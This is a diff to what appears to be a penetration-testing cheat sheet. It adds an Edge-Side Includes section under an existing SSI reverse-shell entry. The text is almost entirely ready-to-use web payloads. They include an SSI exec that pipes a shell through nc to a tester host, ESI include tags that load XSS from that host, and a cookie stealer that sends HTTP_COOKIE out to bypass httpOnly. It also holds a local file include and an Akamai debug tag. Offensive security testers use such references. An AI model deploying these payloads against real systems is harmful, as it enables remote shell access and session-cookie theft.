@@ -89,6 +89,25 @@ Reverse Shell
 Code: html
 <!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
 ```
+### Edge-Side Includes (ESI)
+## ESI Tags
+```
+Code: html
+// Basic detection
+<esi: include src=http://<PENTESTER IP>>
+
+// XSS Exploitation Example
+<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>
+
+// Cookie Stealer (bypass httpOnly flag)
+<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>
+
+// Introduce private local files (Not LFI per se)
+<esi:include src="supersecret.txt">
+
+// Valid for Akamai, sends debug information in the response
+<esi:debug/>
+```
 ### tplmap.py
 ### SSTI Exploitation Example 1
 ```
